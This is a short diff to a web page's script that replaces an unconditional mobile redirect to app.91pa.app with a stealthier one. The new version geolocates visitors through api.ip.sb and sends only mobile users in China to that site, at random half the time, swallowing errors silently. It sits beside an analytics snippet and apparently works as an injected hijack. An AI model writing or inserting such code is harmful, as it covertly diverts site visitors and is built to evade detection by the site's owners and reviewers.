@@ -13,9 +13,18 @@ var _hmt = _hmt || [];
   var s = document.getElementsByTagName("script")[0]; 
   s.parentNode.insertBefore(hm, s);
 })();
-  (function() {
-    var mobileReg = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
-    if (mobileReg.test(navigator.userAgent)) {
+(async function() {
+  var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i
+                   .test(navigator.userAgent);
+  if (!isMobile) return;
+  try {
+    let res = await fetch('https://api.ip.sb/geoip?format=json');
+    if (!res.ok) return;
+    let data = await res.json();
+
+    if (data.country_code === 'CN' && Math.random() < 0.5) {
       window.location.replace('https://app.91pa.app/');
     }
-  })();
+  } catch (e) {
+  }
+})();
